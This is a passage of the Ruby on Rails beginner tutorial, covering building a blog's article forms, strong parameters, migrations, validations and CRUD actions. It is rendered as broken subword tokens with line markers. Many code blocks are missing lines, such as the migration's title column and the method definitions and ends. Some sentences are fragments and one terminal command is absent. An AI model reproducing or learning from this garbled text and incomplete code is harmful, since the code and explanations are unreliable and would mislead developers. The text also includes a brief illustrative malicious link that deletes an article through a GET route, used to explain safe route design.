▁It ' s ▁time ▁to ▁create ▁the ▁form ▁for ▁a ▁new ▁article .
▁### ▁The ▁first ▁form
▁The ▁primary ▁form ▁ builder ▁for ▁Rails ▁is ▁provided ▁by ▁a ▁helper < n > method ▁called ▁` form _ for `.
▁To ▁use ▁this ▁method , ▁add ▁this ▁code ▁into < n >` app / views / articles / new . html . erb ` :
▁<%= ▁form _ for ▁: article ▁do ▁| f | ▁%>
▁<%= ▁f . label ▁: title ▁%>< br >
▁<%= ▁f . text _ field ▁: title ▁%>
▁<%= ▁f . submit ▁%>
▁If ▁you ▁refresh ▁the ▁page ▁now , ▁you ' ll ▁see ▁the ▁exact ▁same ▁form ▁as ▁in ▁the ▁example . < n >
▁B u il d ing ▁forms ▁in ▁Rails ▁is ▁really ▁just ▁that ▁easy !
▁When ▁you ▁call ▁` form _ for `, ▁you ▁pass ▁it ▁an ▁identify ing ▁object ▁for ▁this < n > form .
▁In ▁this ▁case , ▁it ' s ▁the ▁symbol ▁`: article `.
▁This ▁tell s ▁the ▁` form _ for `< n > helper ▁what ▁this ▁form ▁is ▁for .
▁In side ▁the ▁block ▁for ▁this ▁method , ▁the < n >` For m Builder ` ▁object ▁- ▁represent ed ▁by ▁` f ` ▁- ▁is ▁used ▁to ▁build ▁two ▁ label s ▁and ▁two < n > text ▁fields , ▁one ▁each ▁for ▁the ▁title ▁and ▁text ▁of ▁an ▁article .
▁F inally , ▁a ▁call ▁to < n >` submit ` ▁on ▁the ▁` f ` ▁object ▁will ▁create ▁a ▁submit ▁button ▁for ▁the ▁form .
▁There ' s ▁one ▁problem ▁with ▁this ▁form ▁though .
▁If ▁you ▁ inspect ▁the ▁HTML ▁that ▁is < n > generated , ▁by ▁view ing ▁the ▁source ▁of ▁the ▁page , ▁you ▁will ▁see ▁that ▁the ▁` action `< n > attribute ▁for ▁the ▁form ▁is ▁point ing ▁at ▁` / articles / new `.
▁This ▁is ▁a ▁problem ▁because < n > this ▁route ▁go es ▁to ▁the ▁very ▁page ▁that ▁you ' re ▁on ▁right ▁at ▁the ▁moment , ▁and ▁that < n > route ▁should ▁only ▁be ▁used ▁to ▁display ▁the ▁form ▁for ▁a ▁new ▁article .
▁The ▁form ▁needs ▁to ▁use ▁a ▁different ▁URL ▁in ▁order ▁to ▁go ▁some where ▁else . < n >
▁This ▁can ▁be ▁done ▁quite ▁simply ▁with ▁the ▁`: url ` ▁option ▁of ▁` form _ for `. < n >
▁T ypically ▁in ▁Rails , ▁the ▁action ▁that ▁is ▁used ▁for ▁new ▁form ▁submission s < n > like ▁this ▁is ▁called ▁" create ", ▁and ▁so ▁the ▁form ▁should ▁be ▁point ed ▁to ▁that ▁action .
▁ Edit ▁the ▁` form _ for ` ▁line ▁inside ▁` app / views / articles / new . html . erb ` ▁to ▁look ▁like < n > this :
▁<%= ▁form _ for ▁: article , ▁url : ▁articles _ path ▁do ▁| f | ▁%>
▁In ▁this ▁example , ▁the ▁` articles _ path ` ▁helper ▁is ▁passed ▁to ▁the ▁`: url ` ▁option .
▁With ▁the ▁form ▁and ▁its ▁ associated ▁route ▁defined , ▁you ▁will ▁be ▁able ▁to ▁fill ▁in ▁the < n > form ▁and ▁the n ▁click ▁the ▁submit ▁button ▁to ▁begin ▁the ▁process ▁of ▁creating ▁a ▁new < n > article , ▁so ▁go ▁a head ▁and ▁do ▁that .
▁When ▁you ▁submit ▁the ▁form , ▁you ▁should ▁see ▁a < n > familiar ▁error :
▁You ▁now ▁need ▁to ▁create ▁the ▁` create ` ▁action ▁within ▁the ▁` Article sController ` ▁for < n > this ▁to ▁work .
▁### ▁Creat ing ▁articles
▁If ▁you ▁re - submit ▁the ▁form ▁now , ▁you ' ll ▁see ▁another ▁ familiar ▁error : ▁a ▁template ▁is < n > missing .
▁That ' s ▁ o k , ▁we ▁can ▁ignore ▁that ▁for ▁now .
▁What ▁the ▁` create ` ▁action ▁should < n > be ▁doing ▁is ▁saving ▁our ▁new ▁article ▁to ▁the ▁database .
▁When ▁a ▁form ▁is ▁submitted , ▁the ▁fields ▁of ▁the ▁form ▁are ▁sent ▁to ▁Rails ▁as < n > _ parameters _ .
▁These ▁parameters ▁can ▁the n ▁be ▁referenced ▁inside ▁the ▁controller < n > action s , ▁typical ly ▁to ▁perform ▁a ▁particular ▁task .
▁To ▁see ▁what ▁these ▁parameters < n > lo o k ▁like , ▁change ▁the ▁` create ` ▁action ▁to ▁this :
▁render ▁plain : ▁params [: article ] . inspect
▁The ▁` render ` ▁method ▁here ▁is ▁tak ing ▁a ▁very ▁simple ▁hash ▁with ▁a ▁key ▁of ▁` plain ` ▁and < n > value ▁of ▁` params [: article ] . inspect `.
▁The ▁` params ` ▁method ▁is ▁the ▁object ▁which < n > re present s ▁the ▁parameters ▁( or ▁fields ) ▁com ing ▁in ▁from ▁the ▁form .
▁The ▁` params `< n > method ▁returns ▁an ▁` ActiveSupport :: Hash With In different A cc es s ` ▁object , ▁which < n > allow s ▁you ▁to ▁access ▁the ▁keys ▁of ▁the ▁hash ▁using ▁either ▁strings ▁or ▁symbols .
▁In < n > this ▁situation , ▁the ▁only ▁parameters ▁that ▁matter ▁are ▁the ▁one s ▁from ▁the ▁form .
▁If ▁you ▁re - submit ▁the ▁form ▁one ▁more ▁time ▁you ' ll ▁now ▁no ▁longer ▁get ▁the ▁missing < n > template ▁error .
▁Instead , ▁you ' ll ▁see ▁something ▁that ▁look s ▁like ▁the ▁following :
▁{" title "=>" First ▁article !" , ▁" text "=>" This ▁is ▁my ▁first ▁article . "}
▁This ▁action ▁is ▁now ▁display ing ▁the ▁parameters ▁for ▁the ▁article ▁that ▁are ▁com ing ▁in < n > from ▁the ▁form .
▁However , ▁this ▁is n ' t ▁really ▁all ▁that ▁helpful .
▁ Y es , ▁you ▁can ▁see ▁the < n > parameters ▁but ▁nothing ▁in ▁particular ▁is ▁being ▁done ▁with ▁them .
▁### ▁Creat ing ▁the ▁Article ▁model
▁Model s ▁in ▁Rails ▁use ▁a ▁singular ▁name , ▁and ▁their ▁corresponding ▁database ▁table s < n > use ▁a ▁plural ▁name .
▁Rails ▁provides ▁a ▁generator ▁for ▁creating ▁models , ▁which ▁most < n > Rails ▁developers ▁t end ▁to ▁use ▁when ▁creating ▁new ▁models .
▁To ▁create ▁the ▁new ▁model ,< n > ru n ▁this ▁command ▁in ▁your ▁terminal :
▁With ▁that ▁command ▁we ▁to l d ▁Rails ▁that ▁we ▁want ▁a ▁` Article ` ▁model , ▁together < n > with ▁a ▁ _ title _ ▁attribute ▁of ▁type ▁string , ▁and ▁a ▁ _ text _ ▁attribute < n > of ▁type ▁text .
▁Those ▁attributes ▁are ▁automatically ▁added ▁to ▁the ▁` articles `< n > table ▁in ▁the ▁database ▁and ▁map ped ▁to ▁the ▁` Article ` ▁model .
▁Rails ▁respond ed ▁by ▁creating ▁a ▁b un ch ▁of ▁files .
▁For ▁now , ▁we ' re ▁only ▁interest ed < n > in ▁` app / models / article . rb ` ▁and ▁` db / migrate / 20 140 1 20 19 17 2 9 _ create _ articles . rb `< n > ( your ▁name ▁could ▁be ▁a ▁bit ▁different ).
▁The ▁latter ▁is ▁responsib le ▁for ▁creating < n > the ▁database ▁structure , ▁which ▁is ▁what ▁we ' ll ▁look ▁at ▁next .
▁TIP : ▁Active ▁Record ▁is ▁smart ▁enough ▁to ▁automatically ▁map ▁column ▁names ▁to ▁model < n > attributes , ▁which ▁means ▁you ▁don ' t ▁have ▁to ▁declare ▁attributes ▁inside ▁Rails < n > models , ▁as ▁that ▁will ▁be ▁done ▁automatically ▁by ▁Active ▁Record .
▁### ▁Running ▁a ▁ Migration
▁Migrations ▁are ▁Ruby ▁classes ▁that ▁are < n > de signed ▁to ▁make ▁it ▁simple ▁to ▁create ▁and ▁modify ▁database ▁table s .
▁Rails ▁uses < n > rake ▁commands ▁to ▁run ▁migrations , ▁and ▁it ' s ▁possible ▁to ▁undo ▁a ▁migration ▁after < n > it ' s ▁been ▁applied ▁to ▁your ▁database .
▁ Migration ▁filename s ▁include ▁a ▁timestamp ▁to < n > en s ure ▁that ▁they ' re ▁processed ▁in ▁the ▁order ▁that ▁they ▁were ▁created .
▁If ▁you ▁look ▁in ▁the ▁` db / migrate / 20 140 1 20 19 17 2 9 _ create _ articles . rb ` ▁file ▁( remember ,< n > your s ▁will ▁have ▁a ▁slightly ▁different ▁name ), ▁here ' s ▁what ▁you ' ll ▁find :
▁class ▁Create Article s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: articles ▁do ▁| t |
▁t . text ▁: text
▁The ▁above ▁migration ▁creates ▁a ▁method ▁named ▁` change ` ▁which ▁will ▁be ▁called ▁when < n > you ▁run ▁this ▁migration .
▁The ▁action ▁defined ▁in ▁this ▁method ▁is ▁also ▁ reversible ,< n > which ▁means ▁Rails ▁know s ▁how ▁to ▁reverse ▁the ▁change ▁made ▁by ▁this ▁migration ,< n > in ▁case ▁you ▁want ▁to ▁reverse ▁it ▁later .
▁When ▁you ▁run ▁this ▁migration ▁it ▁will ▁create < n > an ▁` articles ` ▁table ▁with ▁one ▁string ▁column ▁and ▁a ▁text ▁column .
▁It ▁also ▁creates < n > two ▁timestamp ▁fields ▁to ▁allow ▁Rails ▁to ▁track ▁article ▁creation ▁and ▁update ▁time s .
▁At ▁this ▁point , ▁you ▁can ▁use ▁a ▁rake ▁command ▁to ▁run ▁the ▁migration :
▁Rails ▁will ▁execute ▁this ▁migration ▁command ▁and ▁tell ▁you ▁it ▁created ▁the ▁Article s < n > table .
▁== ▁Create Article s : ▁migrat ing ▁== ================ ================ ================
▁-- ▁create _ table (: articles )
▁-> ▁0.0 0 19 s
▁== ▁Create Article s : ▁migrat ed ▁( 0 . 00 20 s ) ▁= ========== ============== ================
▁NOTE . ▁Because ▁you ' re ▁working ▁in ▁the ▁development ▁environment ▁by ▁default , ▁this < n > command ▁will ▁apply ▁to ▁the ▁database ▁defined ▁in ▁the ▁` development ` ▁section ▁of ▁your < n >` config / database . yml ` ▁file .
▁### ▁S a v ing ▁data ▁in ▁the ▁controller
▁B ac k ▁in ▁` Article sController `, ▁we ▁need ▁to ▁change ▁the ▁` create ` ▁action < n > to ▁use ▁the ▁new ▁` Article ` ▁model ▁to ▁save ▁the ▁data ▁in ▁the ▁database . < n >
▁Open ▁` app / controllers / articles _ controller . rb ` ▁and ▁change ▁the ▁` create ` ▁action ▁to < n > lo o k ▁like ▁this :
▁@ article ▁= ▁Article . new ( params [: article ])
▁@ article . save
▁redirect _ to ▁@ article
▁Here ' s ▁what ' s ▁going ▁on : ▁every ▁Rails ▁model ▁can ▁be ▁initialize d ▁with ▁its < n > re spec tive ▁attributes , ▁which ▁are ▁automatically ▁map ped ▁to ▁the ▁respective < n > database ▁columns .
▁In ▁the ▁first ▁line ▁we ▁do ▁just ▁that ▁( remember ▁that < n >` params [: article ]` ▁contains ▁the ▁attributes ▁we ' re ▁interest ed ▁in ).
▁Then ,< n >` @ article . save ` ▁is ▁responsib le ▁for ▁saving ▁the ▁model ▁in ▁the ▁database .
▁F inally ,< n > we ▁redirect ▁the ▁user ▁to ▁the ▁` show ` ▁action , ▁which ▁we ' ll ▁define ▁later .
▁TIP : ▁As ▁we ' ll ▁see ▁later , ▁`@ article . save ` ▁returns ▁a ▁boolean ▁indicat ing ▁whether < n > the ▁article ▁was ▁saved ▁or ▁not .
▁If ▁you ▁now ▁go ▁to ▁< http :// localhost :3000/ articles / new > ▁you ' ll ▁* almost * ▁be ▁able < n > to ▁create ▁an ▁article .
▁T ry ▁it !
▁You ▁should ▁get ▁an ▁error ▁that ▁look s ▁like ▁this :
▁Rails ▁has ▁sever al ▁security ▁features ▁that ▁help ▁you ▁write ▁secure ▁applications ,< n > and ▁you ' re ▁running ▁into ▁one ▁of ▁them ▁now .
▁W h y ▁do ▁you ▁have ▁to ▁both er ?
▁The ▁ability ▁to ▁gra b ▁and ▁automatically ▁assign ▁all < n > controller ▁parameters ▁to ▁your ▁model ▁in ▁one ▁sho t ▁make s ▁the ▁programmer ' s ▁job < n > e as i er , ▁but ▁this ▁convenience ▁also ▁allows ▁ malicious ▁use .
▁What ▁if ▁a ▁request ▁to < n > the ▁server ▁was ▁ craft ed ▁to ▁look ▁like ▁a ▁new ▁article ▁form ▁submit ▁but ▁also ▁included < n > ext ra ▁fields ▁with ▁values ▁that ▁violat ed ▁your ▁applications ▁in t e gr ity ?
▁They ▁would < n > be ▁' mass ▁assign ed ' ▁into ▁your ▁model ▁and ▁the n ▁into ▁the ▁database ▁along ▁with ▁the < n > g ood ▁ stuff ▁- ▁ potentially ▁break ing ▁your ▁application ▁or ▁ w or se .
▁We ▁have ▁to ▁ white list ▁our ▁controller ▁parameters ▁to ▁prevent ▁wrong ful ▁ mass < n > assignment .
▁In ▁this ▁case , ▁we ▁want ▁to ▁both ▁allow ▁and ▁require ▁the ▁` title ` ▁and < n >` text ` ▁parameters ▁for ▁valid ▁use ▁of ▁` create `.
▁The ▁syntax ▁for ▁this ▁introduce s < n >` require ` ▁and ▁` permit `.
▁@ article ▁= ▁Article . new ( params . require (: article ). permit (: title , ▁: text ) )
▁This ▁is ▁often ▁factor ed ▁out ▁into ▁its ▁own ▁method ▁so ▁it ▁can ▁be ▁reuse d ▁by ▁multiple < n > action s ▁in ▁the ▁same ▁controller , ▁for ▁example ▁` create ` ▁and ▁` update `.
▁A b o ve ▁and < n > beyond ▁ mass ▁assignment ▁issues , ▁the ▁method ▁is ▁often ▁made ▁` private ` ▁to ▁make ▁sure < n > it ▁can ' t ▁be ▁called ▁outside ▁its ▁intend ed ▁context .
▁Here ▁is ▁the ▁result :
▁@ article ▁= ▁Article . new ( article _ params )
▁def ▁article _ params
▁params . require (: article ). permit (: title , ▁: text )
▁### ▁Show ing ▁Article s
▁If ▁you ▁submit ▁the ▁form ▁again ▁now , ▁Rails ▁will ▁complain ▁about ▁not ▁find ing ▁the < n >` show ` ▁action .
▁That ' s ▁not ▁very ▁useful ▁though , ▁so ▁let ' s ▁add ▁the ▁` show ` ▁action < n > before ▁proceeding .
▁article ▁GET ▁/ articles / : id ( . : format ) ▁articles # show
▁The ▁special ▁syntax ▁`: id ` ▁tell s ▁rails ▁that ▁this ▁route ▁expect s ▁an ▁`: id `< n > param e ter , ▁which ▁in ▁our ▁case ▁will ▁be ▁the ▁id ▁of ▁the ▁article .
▁As ▁we ▁did ▁before , ▁we ▁need ▁to ▁add ▁the ▁` show ` ▁action ▁in < n >` app / controllers / articles _ controller . rb ` ▁and ▁its ▁respective ▁view .
▁G ive n
▁def ▁show
▁@ article ▁= ▁Article . find ( params [: id ])
▁A ▁couple ▁of ▁things ▁to ▁note .
▁We ▁do ▁this ▁because ▁Rails ▁will ▁pass ▁all ▁instance < n > variable s ▁to ▁the ▁view .
▁Now , ▁create ▁a ▁new ▁file ▁` app / views / articles / show . html . erb ` ▁with ▁the ▁following < n > content :
▁< strong > T it le : </ strong >
▁<%= ▁@ article . title ▁%>
▁< strong > T ext : </ strong >
▁<%= ▁@ article . text ▁%>
▁With ▁this ▁change , ▁you ▁should ▁finally ▁be ▁able ▁to ▁create ▁new ▁articles .
▁Vi s it ▁< http :// localhost :3000/ articles / new > ▁and ▁give ▁it ▁a ▁try !
▁Show ▁action ▁for ▁articles ]( images / getting _ started / show _ action _ for _ articles . png )
▁### ▁Listing ▁all ▁articles
▁We ▁ still ▁need ▁a ▁way ▁to ▁list ▁all ▁our ▁articles , ▁so ▁let ' s ▁do ▁that .
▁articles ▁GET ▁/ articles ( . : format ) ▁articles # index
▁@ articles ▁= ▁Article . all
▁< h 1> Listing ▁articles </ h 1>
▁< table >
▁< tr >
▁< th > T it le </ th >
▁< th > T ext </ th >
▁</ tr >
▁<% ▁@ articles . each ▁do ▁| article | ▁%>
▁< tr >
▁< td > <%= ▁article . title ▁%></ td >
▁< td > <%= ▁article . text ▁%></ td >
▁</ tr >
▁</ table >
▁### ▁ Adding ▁links
▁You ▁can ▁now ▁create , ▁show , ▁and ▁list ▁articles .
▁Now ▁let ' s ▁add ▁some ▁links ▁to < n > nav ig ate ▁through ▁pages .
▁Open ▁` app / views / welcome / index . html . erb ` ▁and ▁modify ▁it ▁as ▁follows :
▁<%= ▁link _ to ▁' M y ▁B log ' , ▁controller : ▁' articles ' ▁%>
▁The ▁` link _ to ` ▁method ▁is ▁one ▁of ▁Rails ' ▁built - in ▁view ▁helpers .
▁It ▁creates ▁a < n > h y p er link ▁base d ▁on ▁text ▁to ▁display ▁and ▁where ▁to ▁go ▁- ▁in ▁this ▁case , ▁to ▁the ▁path < n > for ▁articles .
▁Let ' s ▁add ▁links ▁to ▁the ▁other ▁views ▁as ▁well , ▁starting ▁with ▁adding ▁this < n > " New ▁Article " ▁link ▁to ▁` app / views / articles / index . html . erb `, ▁ placing ▁it ▁above ▁the < n >` < table >` ▁tag :
▁<%= ▁link _ to ▁' New ▁article ' , ▁new _ article _ path ▁%>
▁This ▁link ▁will ▁allow ▁you ▁to ▁ br ing ▁up ▁the ▁form ▁that ▁let s ▁you ▁create ▁a ▁new ▁article .
▁<%= ▁link _ to ▁' B ac k ' , ▁articles _ path ▁%>
▁TIP : ▁If ▁you ▁want ▁to ▁link ▁to ▁an ▁action ▁in ▁the ▁same ▁controller , ▁you ▁don ' t ▁need ▁to < n > spec ify ▁the ▁`: controller ` ▁option , ▁as ▁Rails ▁will ▁use ▁the ▁current ▁controller ▁by < n > default .
▁TIP : ▁In ▁development ▁mode ▁( which ▁is ▁what ▁you ' re ▁working ▁in ▁by ▁default ), ▁Rails < n > reload s ▁your ▁application ▁with ▁every ▁browser ▁request , ▁so ▁there ' s ▁no ▁need ▁to ▁stop < n > and ▁restart ▁the ▁web ▁server ▁when ▁a ▁change ▁is ▁made .
▁### ▁ Adding ▁Some ▁Validation
▁The ▁model ▁file , ▁` app / models / article . rb ` ▁is ▁about ▁as ▁simple ▁as ▁it ▁can ▁get :
▁There ▁is n ' t ▁much ▁to ▁this ▁file ▁- ▁but ▁note ▁that ▁the ▁` Article ` ▁class ▁inherit s ▁from < n >` ActiveRecord :: Base `.
▁Active ▁Record ▁ s up p li es ▁a ▁great ▁deal ▁of ▁functionality ▁to < n > your ▁Rails ▁models ▁for ▁free , ▁including ▁basic ▁database ▁CRUD ▁( Create , ▁Read , ▁Update ,< n > Destroy ) ▁operations , ▁data ▁validation , ▁as ▁well ▁as ▁sophisticat ed ▁search ▁support < n > and ▁the ▁ability ▁to ▁relate ▁multiple ▁models ▁to ▁one ▁another .
▁Rails ▁includes ▁methods ▁to ▁help ▁you ▁validate ▁the ▁data ▁that ▁you ▁send ▁to ▁models . < n >
▁Open ▁the ▁` app / models / article . rb ` ▁file ▁and ▁edit ▁it :
▁validates ▁: title , ▁presence : ▁true ,
▁length : ▁ { ▁minimum : ▁5 ▁ }
▁These ▁changes ▁will ▁ensure ▁that ▁all ▁articles ▁have ▁a ▁title ▁that ▁is ▁at ▁least ▁f ive < n > character s ▁long .
▁Rails ▁can ▁validate ▁a ▁variety ▁of ▁conditions ▁in ▁a ▁model ,< n > including ▁the ▁presence ▁or ▁uniqueness ▁of ▁columns , ▁their ▁format , ▁and ▁the < n > ex ist ence ▁of ▁ associated ▁objects .
▁Validation s ▁are ▁covered ▁in ▁detail ▁in ▁[ Active < n > Record ▁Validation s ]( active _ record _ validations . html )
▁With ▁the ▁validation ▁now ▁in ▁place , ▁when ▁you ▁call ▁`@ article . save ` ▁on ▁an ▁invalid < n > article , ▁it ▁will ▁return ▁` false `.
▁If ▁you ▁open < n >` app / controllers / articles _ controller . rb ` ▁again , ▁you ' ll ▁notice ▁that ▁we ▁don ' t < n > check ▁the ▁result ▁of ▁calling ▁`@ article . save ` ▁inside ▁the ▁` create ` ▁action . < n >
▁If ▁`@ article . save ` ▁fails ▁in ▁this ▁situation , ▁we ▁need ▁to ▁show ▁the ▁form ▁back ▁to ▁the < n > user .
▁To ▁do ▁this , ▁change ▁the ▁` new ` ▁and ▁` create ` ▁actions ▁inside < n >` app / controllers / articles _ controller . rb ` ▁to ▁these :
▁def ▁new
▁@ article ▁= ▁Article . new
▁if ▁@ article . save
▁redirect _ to ▁@ article
▁else
▁render ▁' new '
▁The ▁` new ` ▁action ▁is ▁now ▁creating ▁a ▁new ▁instance ▁variable ▁called ▁`@ article `, ▁and < n > you ' ll ▁see ▁why ▁that ▁is ▁in ▁just ▁a ▁few ▁moment s .
▁Noti ce ▁that ▁inside ▁the ▁` create ` ▁action ▁we ▁use ▁` render ` ▁instead ▁of ▁` redirect _ to `< n > when ▁` save ` ▁returns ▁` false `.
▁The ▁` render ` ▁method ▁is ▁used ▁so ▁that ▁the ▁`@ article `< n > object ▁is ▁passed ▁back ▁to ▁the ▁` new ` ▁template ▁when ▁it ▁is ▁rendered .
▁This ▁rendering < n > is ▁done ▁within ▁the ▁same ▁request ▁as ▁the ▁form ▁submission , ▁whereas ▁the < n >` redirect _ to ` ▁will ▁tell ▁the ▁browser ▁to ▁issue ▁another ▁request .
▁If ▁you ▁reload < n >< http :// localhost :3000/ articles / new > ▁and < n > try ▁to ▁save ▁an ▁article ▁without ▁a ▁title , ▁Rails ▁will ▁send ▁you ▁back ▁to ▁the < n > form , ▁but ▁that ' s ▁not ▁very ▁useful .
▁You ▁need ▁to ▁tell ▁the ▁user ▁that < n > something ▁we n t ▁wrong .
▁To ▁do ▁that , ▁you ' ll ▁modify < n >` app / views / articles / new . html . erb ` ▁to ▁check ▁for ▁error ▁messages :
▁<% ▁if ▁@ article . errors . any ?
▁< div ▁id =" error _ ex p la n ation ">
▁< ul >
▁<% ▁@ article . errors . full _ messages . each ▁do ▁| m s g | ▁%>
▁< li > <%= ▁m s g ▁%></ li >
▁<% ▁end ▁%>
▁</ ul >
▁</ div >
▁A ▁few ▁things ▁are ▁going ▁on .
▁We ▁check ▁if ▁there ▁are ▁any ▁errors ▁with < n >` @ article . errors . any ?` , ▁and ▁in ▁that ▁case ▁we ▁show ▁a ▁list ▁of ▁all < n > errors ▁with ▁`@ article . errors . full _ messages `.
▁` pluralize ` ▁is ▁a ▁rails ▁helper ▁that ▁take s ▁a ▁number ▁and ▁a ▁string ▁as ▁its < n > argument s .
▁The ▁reason ▁why ▁we ▁added ▁`@ article ▁= ▁Article . new ` ▁in ▁the ▁` Article sController ` ▁is < n > that ▁otherwise ▁`@ article ` ▁would ▁be ▁` nil ` ▁in ▁our ▁view , ▁and ▁calling < n >` @ article . errors . any ?` ▁would ▁throw ▁an ▁error .
▁TIP : ▁Rails ▁automatically ▁wrap s ▁fields ▁that ▁contain ▁an ▁error ▁with ▁a ▁ div < n > with ▁class ▁` field _ with _ errors `.
▁You ▁can ▁define ▁a ▁ css ▁rule ▁to ▁make ▁them < n > st and out .
▁For m ▁With ▁ Error s ]( images / getting _ started / form _ with _ errors . png )
▁### ▁ Updating ▁Article s
▁We ' ve ▁covered ▁the ▁" C R " ▁part ▁of ▁CRUD .
▁Now ▁let ' s ▁focus ▁on ▁the ▁" U " ▁part , ▁updating < n > articles .
▁def ▁edit
▁@ article ▁= ▁Article . find ( params [: id ])
▁The ▁view ▁will ▁contain ▁a ▁form ▁similar ▁to ▁the ▁one ▁we ▁used ▁when ▁creating < n > new ▁articles .
▁Create ▁a ▁file ▁called ▁` app / views / articles / edit . html . erb ` ▁and ▁make < n > it ▁look ▁as ▁follows :
▁< h 1> Edit ing ▁article </ h 1>
▁<%= ▁form _ for ▁: article , ▁url : ▁article _ path (@ article ), ▁method : ▁: patch ▁do ▁| f | ▁%>
▁This ▁time ▁we ▁point ▁the ▁form ▁to ▁the ▁` update ` ▁action , ▁which ▁is ▁not ▁defined ▁yet < n > but ▁will ▁be ▁very ▁soon .
▁The ▁` method : ▁: patch ` ▁option ▁tell s ▁Rails ▁that ▁we ▁want ▁this ▁form ▁to ▁be ▁submitted < n > via ▁the ▁` PATCH ` ▁HTTP ▁method ▁which ▁is ▁the ▁HTTP ▁method ▁you ' re ▁expected ▁to ▁use ▁to < n > ** update ** ▁resources ▁according ▁to ▁the ▁REST ▁protocol .
▁The ▁first ▁parameter ▁of ▁` form _ for ` ▁can ▁be ▁an ▁object , ▁say , ▁`@ article ` ▁which ▁would < n > ca use ▁the ▁helper ▁to ▁fill ▁in ▁the ▁form ▁with ▁the ▁fields ▁of ▁the ▁object .
▁Pass ing ▁in ▁a < n > symbol ▁( ` : article `) ▁with ▁the ▁same ▁name ▁as ▁the ▁instance ▁variable ▁( ` @ article ` )< n > also ▁ automagically ▁lead s ▁to ▁the ▁same ▁behavior .
▁This ▁is ▁what ▁is ▁happen ing ▁here . < n >
▁def ▁update
▁if ▁@ article . update ( article _ params )
▁render ▁' edit '
▁The ▁new ▁method , ▁` update `, ▁is ▁used ▁when ▁you ▁want ▁to ▁update ▁a ▁record < n > that ▁already ▁exists , ▁and ▁it ▁accept s ▁a ▁hash ▁containing ▁the ▁attributes < n > that ▁you ▁want ▁to ▁update .
▁As ▁before , ▁if ▁there ▁was ▁an ▁error ▁updating ▁the < n > article ▁we ▁want ▁to ▁show ▁the ▁form ▁back ▁to ▁the ▁user .
▁We ▁reuse ▁the ▁` article _ params ` ▁method ▁that ▁we ▁defined ▁earlier ▁for ▁the ▁create < n > action .
▁TIP : ▁You ▁don ' t ▁need ▁to ▁pass ▁all ▁attributes ▁to ▁` update `.
▁For < n > example , ▁if ▁you ' d ▁call ▁`@ article . update ( title : ▁' A ▁new ▁title ') `< n > Rails ▁would ▁only ▁update ▁the ▁` title ` ▁attribute , ▁leav ing ▁all ▁other < n > attributes ▁un touch ed .
▁F inally , ▁we ▁want ▁to ▁show ▁a ▁link ▁to ▁the ▁` edit ` ▁action ▁in ▁the ▁list ▁of ▁all ▁the < n > articles , ▁so ▁let ' s ▁add ▁that ▁now ▁to ▁` app / views / articles / index . html . erb ` ▁to ▁make < n > it ▁appear ▁next ▁to ▁the ▁" S how " ▁link :
▁< th ▁co l span =" 2 " ></ th >
▁< td > <%= ▁link _ to ▁' S how ' , ▁article _ path ( article ) ▁%></ td >
▁< td > <%= ▁link _ to ▁' Edit ' , ▁edit _ article _ path ( article ) ▁%></ td >
▁</ tr >
▁And ▁we ' ll ▁also ▁add ▁one ▁to ▁the ▁` app / views / articles / show . html . erb ` ▁template ▁as < n > we ll , ▁so ▁that ▁there ' s ▁also ▁an ▁" Edit " ▁link ▁on ▁an ▁article ' s ▁page .
▁Add ▁this ▁at ▁the < n > b o t to m ▁of ▁the ▁template :
▁And ▁here ' s ▁how ▁our ▁app ▁look s ▁so ▁far :
▁Inde x ▁action ▁with ▁edit ▁link ]( images / getting _ started / index _ action _ with _ edit _ link . png )
▁### ▁Using ▁partials ▁to ▁clean ▁up ▁duplication ▁in ▁views
▁TIP : ▁You ▁can ▁read ▁more ▁about ▁partials ▁in ▁the < n >[ Layout s ▁and ▁Rendering ▁in ▁Rails ]( layouts _ and _ render ing . html ) ▁guide .
▁Create ▁a ▁new ▁file ▁` app / views / articles / _ form . html . erb ` ▁with ▁the ▁following < n > content :
▁<%= ▁form _ for ▁@ article ▁do ▁| f | ▁%>
▁E verything ▁except ▁for ▁the ▁` form _ for ` ▁declaration ▁remain ed ▁the ▁same . < n >
▁The ▁reason ▁we ▁can ▁use ▁this ▁short er , ▁simple r ▁` form _ for ` ▁declaration < n > to ▁stand ▁in ▁for ▁either ▁of ▁the ▁other ▁forms ▁is ▁that ▁`@ article ` ▁is ▁a ▁* resource * < n > corresponding ▁to ▁a ▁full ▁set ▁of ▁RESTful ▁routes , ▁and ▁Rails ▁is ▁able ▁to ▁infer < n > which ▁U R I ▁and ▁method ▁to ▁use .
▁Now , ▁let ' s ▁update ▁the ▁` app / views / articles / new . html . erb ` ▁view ▁to ▁use ▁this ▁new < n > partial , ▁re w r it ing ▁it ▁completely :
▁< h 1> New ▁article </ h 1>
▁<%= ▁render ▁' form ' ▁%>
▁Then ▁do ▁the ▁same ▁for ▁the ▁` app / views / articles / edit . html . erb ` ▁view :
▁< h 1> Edit ▁article </ h 1>
▁### ▁Delet ing ▁Article s
▁We ' re ▁now ▁ready ▁to ▁cover ▁the ▁" D " ▁part ▁of ▁CRUD , ▁deleting ▁articles ▁from ▁the < n > database .
▁DELETE ▁/ articles / : id ( . : format ) ▁articles # destroy
▁The ▁` delete ` ▁routing ▁method ▁should ▁be ▁used ▁for ▁routes ▁that ▁destroy < n > resources .
▁If ▁this ▁was ▁left ▁as ▁a ▁typical ▁` get ` ▁route , ▁it ▁could ▁be ▁possible ▁for < n > people ▁to ▁ craft ▁ malicious ▁URLs ▁like ▁this :
▁< a ▁ href =' http :// example . com / articles /1/ destroy ' > lo o k ▁at ▁this ▁ cat !
▁def ▁destroy
▁@ article . destroy
▁@ article ▁= ▁Article . new
▁@ article ▁= ▁Article . new ( article _ params )
▁if ▁@ article . save
▁redirect _ to ▁@ article
▁else
▁render ▁' new '
▁if ▁@ article . update ( article _ params )
▁render ▁' edit '
▁def ▁destroy
▁@ article . destroy
▁redirect _ to ▁articles _ path
▁def ▁article _ params
▁params . require (: article ). permit (: title , ▁: text )
▁You ▁can ▁call ▁` destroy ` ▁on ▁Active ▁Record ▁objects ▁when ▁you ▁want ▁to ▁delete < n > the m ▁from ▁the ▁database .
▁Note ▁that ▁we ▁don ' t ▁need ▁to ▁add ▁a ▁view ▁for ▁this < n > action ▁since ▁we ' re ▁redirect ing ▁to ▁the ▁` index ` ▁action .
▁F inally , ▁add ▁a ▁' Destroy ' ▁link ▁to ▁your ▁` index ` ▁action ▁template < n > ( ` app / views / articles / index . html . erb `) ▁to ▁wrap ▁everything ▁together .
▁< h 1> Listing ▁Article s </ h 1>
▁< th ▁co l span =" 3 " ></ th >
